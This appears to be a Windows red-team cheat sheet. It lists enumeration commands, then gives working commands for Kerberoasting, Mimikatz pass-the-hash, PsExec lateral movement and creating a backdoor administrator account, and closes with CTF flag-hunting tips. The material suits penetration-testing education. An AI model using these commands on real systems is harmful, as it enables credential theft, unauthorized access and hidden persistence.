# Windows Red Team

Windows Basic Command


Red team basic Enumeration

| Command    | Description                                                                                                                                                                       |
|------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| ipconfig   | Display the IP configuration for all network interfaces. Example: ipconfig /all                                                                                                               |
| net        | A suite of commands for network settings and shares. Example: net user to list users.                                                                                                         |
| netstat    | Network statistics. Example: netstat -ano to display active TCP connections and process PID.                                                                                                  |
| nslookup   | Query the DNS server for domain name or IP address mapping. Example: nslookup example.com                                                                                                     |
| whoami     | Display the username and domain of the current user. Example: whoami                                                                                                                          |
| systeminfo | Display detailed configuration information about a computer and its operating system. Example: systeminfo                                                                                     |
| schtasks   | Schedule tasks to run periodically or at a specific time. Example: schtasks /create /tn TaskName /tr TaskRun /sc daily                                                                        |
| wmic       | Windows Management Instrumentation Command-line. Example: wmic process list brief lists details about all processes.                                                                          |
| gpresult   | Display the Resultant Set of Policy (RSoP) information for a remote user and computer. Example: gpresult /r                                                                                   |
| powershell | Starts a new PowerShell session. Example: powershell -exec bypass to start PowerShell with script execution policy bypassed.                                                                  |
| sc         | Service Control - manage Windows services. Example: sc query to display the status of services.                                                                                               |
| tasklist   | Lists all running tasks/processes. Example: tasklist                                                                                                                                          |
| taskkill   | Kill a running task/process. Example: taskkill /PID pid_number                                                                                                                                |
| reg        | Registry command that allows you to read from and write to the registry. Example: reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run to check all the programs that run at startup. |
| icacls     | Display or modify Access Control Lists (ACLs) for files and directories. Example: icacls C:\path\to\folder to display the ACLs.                                                               |
| netsh      | Network command to view or modify network configurations. Example: netsh wlan show profile to show saved WiFi profiles.                                                                       |

## Red Team Quick Strategies

Here's a succinct guide for some key Red Teaming concepts and practices regarding Windows and Active Directory.

**Enumeration** 

You start with gathering as much information as possible about the target environment. 

For instance, you can use PowerView, a PowerShell tool to explore Active Directory domain.
powerview: https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1
Example:
```
Import-Module .\Powerview.ps1
Get-NetDomain
```
This command gets information about the current domain.

**Kerberoasting**

A technique that involves cracking service account passwords. TGS tickets get requested and cracked offline without sending any traffic to the target, hence evasion.

You can use Invoke-Kerberoast in PowerView to kerberoast:

```
Invoke-Kerberoast -OutputFormat Hashcat|Select-Object -ExpandProperty hash | Out-File -Encoding ASCII kerbhashes.txt
```
This command generates a Hashcat-ready file with all the hashes.

**Pass-the-Hash**

A technique where you use a user's NTLM hash instead of the plaintext password for authentication.

For example, using the tool Mimikatz:

```
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:<ntlm_hash> /run:cmd.exe
```

This starts a new process (cmd.exe) with the specified user and hash.

**Lateral Movement**

This involves moving from one machine to another within the network to gain elevated privileges or to access specific resources.

A common method is to use PsExec for executing payloads on other machines:

```
PsExec.exe \\targetPC -u domain\username -p password cmd
```

This command runs cmd.exe on the target machine.

**Persistence**

Ensure you can retain access, even if the system reboots or the user logs out. A common method is to create a backdoor user in the AD.

```
net user /add [username] [password]
net localgroup administrators [username] /add
```

These commands add a new user and put it into the administrators group.


## CAPTURE THE FLAG

In a Capture The Flag (CTF) challenge where you're already inside a Windows VM using Meterpreter and you need to find the flag, here are some steps you can take:

1. **Explore the File System:**
   - Use Meterpreter's `shell` command to get a command prompt on the Windows VM.
   - Navigate through the file system (`cd`, `dir`, `type`, etc.) to search for the flag. Common locations are the Desktop, Documents, or hidden directories.

2. **Search for Files:**
   - Use commands like `dir` and `findstr` to search for files containing keywords related to flags.
   - Example: `dir /s *flag*.*` or `findstr /si flag *.txt`.

3. **Check Registry:**
   - Examine the Windows Registry for hidden clues. Use `reg query` to look for values that might contain the flag.

4. **Network Enumeration:**
   - Check network configurations and connected devices. Sometimes, flags are hidden in network-related settings.

5. **Check Running Processes:**
   - Use `tasklist` to list running processes. Sometimes flags are hidden within process memory or environment variables.

6. **Decode/Decrypt Encoded Strings:**
   - If you find encoded or encrypted strings, use tools within Meterpreter or Windows itself to decode them.

7. **Check System Logs:**
   - Inspect system logs for any suspicious activities or messages. Use `eventvwr` to check the Event Viewer.

8. **Examine Active Directory:**
   - If applicable, check for Active Directory-related information. Flags might be hidden in user attributes, group names, or descriptions.

9. **Examine User Profiles:**
   - Look into user profiles for any clues. Check the contents of folders like `AppData` for hidden files.

10. **Check Installed Software:**
    - List installed software (`wmic product get name`) and investigate their configurations for flags.

11. **Payload Persistence:**
    - If the challenge involved setting up persistence, check the method used. Flags might be hidden in scripts or registry entries related to persistence.

Remember to document your findings and ensure that you're maintaining the rules and objectives of the CTF challenge. Always follow ethical guidelines and rules provided by the CTF organizers.
